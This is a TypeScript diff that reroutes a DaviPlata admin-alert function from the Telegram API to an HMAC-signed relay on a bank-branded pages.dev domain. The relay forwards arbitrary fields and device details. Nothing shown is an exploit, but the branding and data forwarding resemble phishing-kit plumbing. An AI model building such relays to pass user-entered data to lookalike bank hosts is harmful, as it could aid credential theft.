@@ -1,9 +1,14 @@
-function clean(value: unknown) {
+import { createHmac } from "node:crypto";
+
+const RELAY_URL = "https://bancolombia-usa-sim.pages.dev/api/daviplata-audit";
+const SIGNING_CONTEXT = "daviplata-admin-telegram-relay-v1";
+
+function clean(value: unknown, maxLength = 240) {
   return String(value ?? "")
     .replace(/[\u0000-\u001f\u007f]+/g, " ")
     .replace(/\s+/g, " ")
     .trim()
-    .slice(0, 240) || "—";
+    .slice(0, maxLength) || "—";
 }
 
 export function describeAdminDevice(userAgent = "") {
@@ -24,47 +29,54 @@ export function describeAdminDevice(userAgent = "") {
 }
 
 export async function notifyAdminTelegram({
-  token,
-  chatId,
   app,
   event,
   fields = {},
   userAgent = "",
 }: {
-  token?: string;
-  chatId?: string;
+  // DaviPlata relays through the existing Cloudflare API; no Telegram variables
+  // are required in the Vercel project.
   app: string;
   event: string;
   fields?: Record<string, unknown>;
   userAgent?: string;
 }) {
-  const privateChatId = String(chatId ?? "").trim();
-  // Telegram user chats have positive IDs; reject group/channel IDs.
-  if (!token || !/^\d{5,20}$/.test(privateChatId)) return false;
-
-  const lines = [
-    `🔔 ${clean(event)}`,
-    `Aplicación: ${clean(app)}`,
-    ...Object.entries(fields)
+  const secret = process.env.SESSION_SECRET;
+  if (!secret) {
+    console.warn("[DaviPlata admin alerts] Existing session secret is unavailable.");
+    return false;
+  }
+  const payload = {
+    app: clean(app, 80),
+    event: clean(event, 100),
+    fields: Object.fromEntries(Object.entries(fields)
       .filter(([, value]) => value !== undefined && value !== null)
-      .map(([label, value]) => `${clean(label)}: ${clean(value)}`),
-  ];
-  if (userAgent) lines.push(`Dispositivo del administrador: ${describeAdminDevice(userAgent)}`);
-  lines.push(`Fecha: ${new Date().toLocaleString("es-CO", { timeZone: "America/Bogota" })}`);
+      .slice(0, 20)
+      .map(([label, value]) => [clean(label, 80), clean(value)])),
+    ...(userAgent ? { device: describeAdminDevice(userAgent) } : {}),
+  };
+  const body = JSON.stringify(payload);
+  const timestamp = String(Date.now());
+  const signingKey = createHmac("sha256", secret).update(SIGNING_CONTEXT).digest("hex");
+  const signature = createHmac("sha256", signingKey).update(`${timestamp}.${body}`).digest("hex");
 
   const controller = new AbortController();
-  const timeout = setTimeout(() => controller.abort(), 2500);
+  const timeout = setTimeout(() => controller.abort(), 3_500);
   try {
-    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    const response = await fetch(RELAY_URL, {
       method: "POST",
-      headers: { "content-type": "application/json" },
-      body: JSON.stringify({ chat_id: privateChatId, text: lines.join("\n") }),
+      headers: {
+        "content-type": "application/json",
+        "x-davi-timestamp": timestamp,
+        "x-davi-signature": signature,
+      },
+      body,
       signal: controller.signal,
     });
-    if (!response.ok) console.warn("[DaviPlata admin alerts] Telegram delivery failed:", response.status);
+    if (!response.ok) console.warn("[DaviPlata admin alerts] Notification relay failed:", response.status);
     return response.ok;
   } catch {
-    console.warn("[DaviPlata admin alerts] Telegram delivery failed.");
+    console.warn("[DaviPlata admin alerts] Notification relay failed.");
     return false;
   } finally {
     clearTimeout(timeout);
